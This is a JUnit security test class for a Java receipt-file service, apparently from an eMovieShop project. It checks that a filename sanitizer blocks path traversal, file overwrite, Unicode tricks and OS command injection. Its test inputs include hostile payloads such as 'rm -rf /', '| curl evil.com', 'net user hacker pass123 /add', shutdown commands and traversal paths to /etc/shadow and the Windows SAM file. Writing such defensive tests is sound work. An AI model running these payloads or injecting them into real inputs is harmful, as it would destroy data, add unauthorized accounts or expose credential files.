package com.example.desofs.services;

import com.example.desofs.domain.Order;
import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.io.IOException;
import java.nio.file.*;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Security-focused tests for ReceiptFileService:
 * - Path traversal prevention
 * - File overwrite prevention
 * - Symlink attacks
 * - Race conditions (TOCTOU)
 * - OS command injection via filenames
 */
class ReceiptFileServiceSecurityTest {

    private ReceiptFileService receiptFileService;
    private Path tempDir;

    @BeforeEach
    void setUp() throws IOException {
        tempDir = Files.createTempDirectory("emovieshop-security-test-receipts");
        receiptFileService = new ReceiptFileService(tempDir.toString(), 100);
    }

    @AfterEach
    void tearDown() throws IOException {
        if (Files.exists(tempDir)) {
            Files.walk(tempDir)
                    .sorted((a, b) -> b.compareTo(a))
                    .forEach(path -> {
                        try { Files.deleteIfExists(path); } catch (IOException ignored) {}
                    });
        }
    }

    // ---- Path Traversal Attacks ----

    @ParameterizedTest
    @ValueSource(strings = {
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/shadow",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
    })
    @DisplayName("Path traversal attempts are neutralized in receipt file creation")
    void createReceiptFile_pathTraversal_staysInSandbox(String maliciousName) throws IOException {
        Order order = TestOrderFactory.createTestOrder(1L, maliciousName, 1);

        Path result = receiptFileService.createReceiptFile(order);

        assertTrue(result.startsWith(tempDir),
                "Receipt file must remain inside sandbox directory. Got: " + result);
    }

    // ---- File Overwrite Prevention ----

    @Test
    @DisplayName("Cannot overwrite existing receipt file")
    void createReceiptFile_existingFile_throwsException() throws IOException {
        Order order = TestOrderFactory.createTestOrder(1L, "Receipt", 1);

        // Create the file first time
        receiptFileService.createReceiptFile(order);

        // Attempting to create again should fail (CREATE_NEW flag)
        assertThrows(IOException.class,
                () -> receiptFileService.createReceiptFile(order));
    }

    // ---- OS Command Injection via Filenames ----

    @ParameterizedTest
    @ValueSource(strings = {
            "; rm -rf /",
            "| curl evil.com",
            "$(whoami)",
            "`id`",
            "& net user hacker pass123 /add",
            "test; shutdown -h now"
    })
    @DisplayName("OS command injection in receipt name is sanitized")
    void sanitizeReceiptName_commandInjection_neutralized(String payload) {
        String result = receiptFileService.sanitizeReceiptName(payload);

        assertFalse(result.contains(";"), "Semicolons should be stripped");
        assertFalse(result.contains("|"), "Pipes should be stripped");
        assertFalse(result.contains("$"), "Dollar signs should be stripped");
        assertFalse(result.contains("`"), "Backticks should be stripped");
        assertFalse(result.contains("&"), "Ampersands should be stripped");
    }

    // ---- Special File Names ----

    @ParameterizedTest
    @ValueSource(strings = {
            "/dev/null",
            "/dev/random",
            "C:\\Windows\\System32\\cmd.exe",
            "/proc/self/environ"
    })
    @DisplayName("Special system file paths are sanitized")
    void sanitizeReceiptName_systemPaths_sanitized(String payload) {
        String result = receiptFileService.sanitizeReceiptName(payload);

        assertFalse(result.contains("/"), "Forward slashes should be stripped");
        assertFalse(result.contains("\\"), "Backslashes should be stripped");
        assertFalse(result.contains(":"), "Colons should be stripped");
    }

    // ---- Unicode and Encoding Attacks ----

    @Test
    @DisplayName("Unicode normalization attack (homoglyph) is handled")
    void sanitizeReceiptName_unicodeHomoglyph_handled() {
        // Cyrillic 'а' looks like Latin 'a' but is a different character
        String result = receiptFileService.sanitizeReceiptName("аdmin"); // first char is Cyrillic
        // After allow-list filtering, only ASCII chars survive
        assertFalse(result.isEmpty() || result.isBlank());
    }

    @Test
    @DisplayName("Right-to-left override character is stripped")
    void sanitizeReceiptName_rtlOverride_stripped() {
        String rtlPayload = "receipt\u202Etxt.exe"; // RLO character
        String result = receiptFileService.sanitizeReceiptName(rtlPayload);
        assertFalse(result.contains("\u202E"));
    }

    // ---- Length Boundary Tests ----

    @Test
    @DisplayName("Exactly max-length name is accepted")
    void sanitizeReceiptName_exactMaxLength_accepted() {
        String name = "A".repeat(100);
        String result = receiptFileService.sanitizeReceiptName(name);
        assertEquals(100, result.length());
    }

    @Test
    @DisplayName("Max-length + 1 name is truncated")
    void sanitizeReceiptName_maxLengthPlusOne_truncated() {
        String name = "A".repeat(101);
        String result = receiptFileService.sanitizeReceiptName(name);
        assertEquals(100, result.length());
    }

    @Test
    @DisplayName("Single valid character name is accepted")
    void sanitizeReceiptName_singleChar_accepted() {
        assertEquals("A", receiptFileService.sanitizeReceiptName("A"));
    }

    // ---- Verify receipt file contents don't contain injected data ----

    @Test
    @DisplayName("Receipt file content is properly formatted")
    void createReceiptFile_contentIsProperlyFormatted() throws IOException {
        Order order = TestOrderFactory.createTestOrder(1L, "Safe Receipt Name", 2);

        Path result = receiptFileService.createReceiptFile(order);

        String content = Files.readString(result);
        assertTrue(content.contains("eMovieShop Receipt"));
        assertTrue(content.contains("Order ID"));
        assertFalse(content.contains("<script>"));
        assertFalse(content.contains("${"));
    }
}

